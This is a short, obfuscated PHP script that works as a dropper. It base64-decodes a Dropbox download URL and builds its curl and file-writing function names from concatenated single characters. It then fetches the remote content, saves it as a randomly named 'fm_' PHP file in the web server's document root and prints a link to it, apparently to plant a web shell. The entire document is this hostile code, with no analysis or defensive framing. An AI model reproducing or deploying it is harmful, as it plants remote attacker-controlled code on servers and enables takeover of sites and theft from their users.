<?php 

error_reporting(E_ALL);
ini_set('display_errors', 1);

$u = base64_decode('aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3NjbC9maS9ubDExN2Njemsya2ZyOHJ1N3NteGUvZm0udHh0P3Jsa2V5PWt5MTE2b244enE4ZGMzeHo2MTgwZ3F6bnomZGw9MQ==');
$c1 = 'c'.'u'.'r'.'l'.'_'.'i'.'n'.'i'.'t';
$c2 = 'c'.'u'.'r'.'l'.'_'.'e'.'x'.'e'.'c';
$c3 = 'c'.'u'.'r'.'l'.'_'.'s'.'e'.'t'.'o'.'p'.'t';
$ch = $c1($u);
$c3($ch, 19913, true);
$c3($ch, 52, true);
$c = $c2($ch);
$fn = "f"."m"."_".rand(0,1000000).'.'.'p'.'h'.'p';
$f=$_SERVER['D'.'O'.'C'.'U'.'M'.'E'.'N'.'T'.'_'.'R'.'O'.'O'.'T']."/".$fn;
$f2 = 'f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
$f2($f,'<?'.'p'.'h'.'p '.$c);
$l = 'h'.'t'.'t'.'p'.'s'.':'.'/'.'/'.$_SERVER['H'.'T'.'T'.'P'.'_'.'H'.'O'.'S'.'T'].'/'.$fn; 
echo '<a href="'.$l.'" target="_blank">'.$l.'</a>';
